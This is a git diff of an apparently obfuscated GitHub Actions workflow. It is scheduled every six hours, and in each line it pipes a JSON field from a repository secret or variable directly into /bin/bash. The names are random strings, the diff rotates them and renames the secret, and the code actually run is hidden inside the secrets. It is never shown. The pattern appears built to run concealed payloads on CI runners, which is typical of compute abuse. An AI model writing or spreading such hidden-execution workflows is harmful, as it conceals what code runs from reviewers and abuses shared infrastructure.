@@ -2,33 +2,31 @@ name: luoyuzhe6712
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 2/6 * * *'
+    - cron: '14 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: luoyuzhe6712
         env:
-          cm64430: ${{ secrets.cm64430 }}
+          z6686: ${{ secrets.z6686 }}
         run: |
-          echo $cm64430 | jq -r .air72926 | /bin/bash
-          echo $ksfoj00 | jq -r .yfrgq77345 | /bin/bash
-          echo $n43 | jq -r .u3 | /bin/bash
-          echo $alwbz072 | jq -r .suu50349 | /bin/bash
-          echo $q61646 | jq -r .qe092 | /bin/bash
-          echo $b096 | jq -r .qvzua4 | /bin/bash
-          echo $zkp43087 | jq -r .opb4 | /bin/bash
-          echo $fpat3030 | jq -r .yb72670 | /bin/bash
-          echo $yi3412 | jq -r .oq179 | /bin/bash
-          echo $owbr8 | jq -r .p49 | /bin/bash
-          echo $huk7809 | jq -r .murl95540 | /bin/bash
-          echo $zp4 | jq -r .qhvvt5849 | /bin/bash
-          echo $eodvh6572 | jq -r .mrbc2 | /bin/bash
-          echo $ixmx081 | jq -r .sabf29 | /bin/bash
-          echo $b6774 | jq -r .n01550 | /bin/bash
-          echo $x27 | jq -r .ppydy70 | /bin/bash
-          echo $dgj347 | jq -r .yzso9 | /bin/bash
-          echo $vyj6 | jq -r .oab51 | /bin/bash
+          echo $z6686 | jq -r .p6 | /bin/bash
+          echo $xwv913 | jq -r .srovv7 | /bin/bash
+          echo $dfy64 | jq -r .kyhay4 | /bin/bash
+          echo $pr5 | jq -r .uiez040 | /bin/bash
+          echo $ev65 | jq -r .fyu71401 | /bin/bash
+          echo $lbvg43 | jq -r .fphtd06 | /bin/bash
+          echo $syq1 | jq -r .l928 | /bin/bash
+          echo $cywb3 | jq -r .fe06 | /bin/bash
+          echo $d19569 | jq -r .ix1 | /bin/bash
+          echo $eucjj5 | jq -r .tuu1238 | /bin/bash
+          echo $briif77 | jq -r .n6 | /bin/bash
+          echo $nyi0790 | jq -r .pzhrk67844 | /bin/bash
+          echo $w84440 | jq -r .sc0 | /bin/bash
+          echo $gwdje530 | jq -r .jyyxg98662 | /bin/bash
+          echo $zj1 | jq -r .zcgxf92 | /bin/bash
+          echo $vh1 | jq -r .yh05 | /bin/bash
+          echo $v4 | jq -r .gzayd971 | /bin/bash
 
